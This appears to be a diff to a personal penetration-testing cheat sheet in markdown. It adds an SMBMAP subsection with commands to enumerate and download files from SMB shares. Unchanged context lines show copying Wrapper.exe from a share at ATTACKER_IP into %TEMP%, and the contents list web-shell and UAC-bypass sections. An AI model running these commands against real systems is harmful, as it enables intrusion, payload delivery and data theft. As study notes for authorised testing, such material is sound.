@@ -12,7 +12,8 @@
     - [Web shell | mssql](#web-shell--mssql)
   - [Powershell](#powershell)
     - [Enumeration](#enumeration)
-- [SMB](#smb)
+- [SMB - 445](#smb---445)
+  - [SMBMAP](#smbmap)
 - [RDP](#rdp)
 - [Bypass User Account Control (UAC)](#bypass-user-account-control-uac)
   - [GUI bypass](#gui-bypass)
@@ -466,7 +467,7 @@
 - Owner
   - Get-Acl
 
-# SMB
+# SMB - 445
 - Server Message BLock
 - share of files on the network
 - Commands
@@ -497,6 +498,12 @@ copy \\ATTACKER_IP\share\Wrapper.exe %TEMP%\wrapper-USERNAME.exe
 # Disconnect server
 net use \\ATTACKER_IP\share /del
 ```
+
+## SMBMAP
+- Enumerate
+  - smbmap -u USER -H $target -r /ShareNAME/Folder
+- Download
+  - smbmap -u USER -H $target -r /ShareNAME/Folder -A File to download
 
 # RDP
 - Basic login
